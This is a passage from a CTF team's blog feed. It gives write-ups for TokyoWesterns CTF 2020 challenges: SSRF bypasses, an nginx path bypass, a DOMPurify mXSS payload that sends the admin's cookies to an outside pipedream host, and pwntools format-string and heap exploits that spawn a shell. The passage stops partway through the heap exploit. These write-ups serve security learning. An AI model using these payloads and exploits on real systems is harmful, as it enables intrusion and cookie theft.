  0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; S &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;length l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; Some a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0
  &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intro&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2 subgoals &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 60&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; Some a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0
  &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 53&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;
  a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A
  l &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;
  IHl &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length l &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a
  n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  IHn &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  S n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;S n&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;simpl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 68&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  A &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;
  a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A
  l &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;list&lt;/span&gt;
  IHl &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length l &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a
  n &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nat&lt;/span&gt;
  IHn &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cons a l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  S n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; S &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;length l&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;exists&lt;/span&gt; a0 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; nth l n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Some a0

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; arith&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally we have the flag:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;gj flag: DrgnS{xxxx_my_c0q_for_4_flag_17bcbc34b7c565a766e335}&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TokyoWesterns CTF 6th 2020 Writeup</title>
      <link>https://b6a.black/posts/2020-09-23-twctf/</link>
      <pubDate>Fri, 09 Oct 2020 00:53:29 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-09-23-twctf/</guid>
      <description>&lt;h2 id=&#34;urlcheck-v1-web-98-points&#34;&gt;urlcheck v1 (Web, 98 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Objective: SSRF &lt;code&gt;http://127.0.0.1/admin-status&lt;/code&gt;
The input needs to fulfil the pattern &lt;code&gt;&#39;\A(\d+)\.(\d+)\.(\d+)\.(\d+)\Z&#39;&lt;/code&gt; and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, &lt;code&gt;int(&amp;quot;0177&amp;quot;)&lt;/code&gt; is still 177 instead of 127 in Python, so we can use &lt;code&gt;http://0177.0.0.1/admin-status&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;urlcheck-v2-web-128-points&#34;&gt;urlcheck v2 (Web, 128 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Objective: SSRF &lt;code&gt;http://localhost/admin-status&lt;/code&gt;
Standard TOCTOU bug, just use DNS rebinding to get access:
&lt;code&gt;http://23bbd91c.7f000001.rbndr.us/admin-status&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;angular-of-the-universe-part-one-web-139-points&#34;&gt;Angular of the Universe, part one (Web, 139 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Objective of flag 1 is to access &lt;code&gt;/debug/answer&lt;/code&gt; route in Angular through the nginx proxy, but &lt;code&gt;debug&lt;/code&gt; is filtered and &lt;code&gt;/debug&lt;/code&gt; is blocked in nginx.
In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So &lt;code&gt;/debug/answer/../..&lt;/code&gt; will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in &lt;code&gt;server.ts&lt;/code&gt;, use &lt;code&gt;d%65bug&lt;/code&gt; instead of &lt;code&gt;debug&lt;/code&gt;. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload:
&lt;code&gt;GET /d%65bug/answer//../../a HTTP/1.1&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;bfnote-web-320-points&#34;&gt;bfnote (Web, 320 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;During the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: &lt;a href=&#34;https://github.com/cure53/DOMPurify/commit/02724b8eb048dd219d6725b05c3000936f11d62d#diff-f44bc3a1bfaa31000b8f4f1359dba82aR1085&#34;&gt;&lt;code&gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;table&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;math&amp;gt;CLICKME&amp;lt;/math&amp;gt;&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Eventually we have constructed the following payload to steal cookies from the admin:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;table&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;math&amp;gt;&amp;lt;img src=//7a58976474871f9e062175cbd8755cbc.m.pipedream.net/q onerror=location=this.src+document.cookie&amp;gt;&amp;lt;/math&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;nothing-more-to-say-2020-pwn-111-points&#34;&gt;nothing more to say 2020 (Pwn, 111 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwn02.chal.ctf.westerns.tokyo&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18247&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmtp&lt;/span&gt;(payload):

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%28$p&amp;#34;&lt;/span&gt;
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(fmtp(payload),&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leak&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x118&lt;/span&gt;
ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; stack&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x108&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%7$s||||&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(stack)
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fmtstr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fmtstr_payload(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, {ret: stack&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;}, write_size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;byte&amp;#39;&lt;/span&gt;)
fmtp(payload)
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; asm(shellcraft&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;amd64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sh())
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have the flag: &lt;code&gt;TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}&lt;/code&gt;. Translating via google: &lt;code&gt;This is TWCTF, which has begun&lt;/code&gt;. Where has kotoshi gone?&lt;/p&gt;

&lt;h2 id=&#34;online-nonogram-pwn-252-points&#34;&gt;Online Nonogram (Pwn, 252 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The vulnerability is that we can overwrite the vector pointer to maze chunks.&lt;/p&gt;

&lt;p&gt;First leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with &lt;code&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwn03.chal.ctf.westerns.tokyo&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22915&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;calc&lt;/span&gt;(off):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; int(((off&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dele&lt;/span&gt;(index):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Index&amp;#39;&lt;/span&gt;,str(index))
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Success&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(title, size, payload):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Title: &amp;#39;&lt;/span&gt;, title)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Size: &amp;#39;&lt;/span&gt;, str(size))
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Puzzle: &amp;#39;&lt;/span&gt;, payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;leakp&lt;/span&gt;(index):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Index&amp;#39;&lt;/span&gt;,str(index))
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Row&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s Numbers&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Column&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s Numbers&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;invalid choice&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; a

&lt;span style=&#34;color:#75715e&#34;&gt;# leak heap info&lt;/span&gt;
offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test2&amp;#39;&lt;/span&gt;, calc(offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset)
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leakp(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:][::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;:]
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(leak,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leak: {}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hex(heap)))
target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;
new_heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x520&lt;/span&gt;
heap_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11f90&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# add padding to prevent freed large chunk consolidate with top chunk &lt;/span&gt;
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pad&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
dele(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# forge vector and maze chunk&lt;/span&gt;
forged_chunk1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xb0&lt;/span&gt;
forged_chunk2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xe0&lt;/span&gt;
